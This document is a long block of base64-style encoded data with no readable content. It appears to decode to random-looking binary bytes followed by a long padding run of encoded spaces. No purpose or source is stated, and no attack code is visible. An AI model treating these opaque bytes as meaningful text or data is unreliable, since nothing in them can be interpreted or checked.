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gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg